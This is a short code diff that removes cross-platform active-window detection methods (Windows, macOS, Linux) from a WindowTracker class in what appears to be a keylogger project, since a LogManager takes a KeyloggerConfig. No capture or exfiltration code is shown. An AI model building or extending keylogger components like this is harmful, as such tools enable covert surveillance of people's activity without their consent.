@@ -128,53 +128,6 @@ class WindowTracker:
 
         return None
 
-    @staticmethod
-    def _get_windows_window() -> str | None:
-        try:
-            hwnd = win32gui.GetForegroundWindow()
-            _, pid = (win32process.GetWindowThreadProcessId(hwnd))
-            process = psutil.Process(pid)
-            title = win32gui.GetWindowText(hwnd)
-            if title:
-                return (f"{process.name()} - {title}")
-            return process.name()
-        except Exception:
-            return None
-
-    @staticmethod
-    def _get_macos_window() -> str | None:
-        try:
-            active = (
-                NSWorkspace.sharedWorkspace().activeApplication()
-            )
-            return active.get(
-                'NSApplicationName',
-                'Unknown',
-            )
-        except Exception:
-            return None
-
-    @staticmethod
-    def _get_linux_window() -> str | None:
-        try:
-            result = subprocess.run(
-                [
-                    'xdotool',
-                    'getactivewindow',
-                    'getwindowname',
-                ],
-                capture_output = True,
-                text = True,
-                timeout = 1,
-                check = False,
-            )
-            if result.returncode == 0:
-                return result.stdout.strip()
-            return None
-        except Exception:
-            return None
-
-
 class LogManager:
 
     def __init__(self, config: KeyloggerConfig):
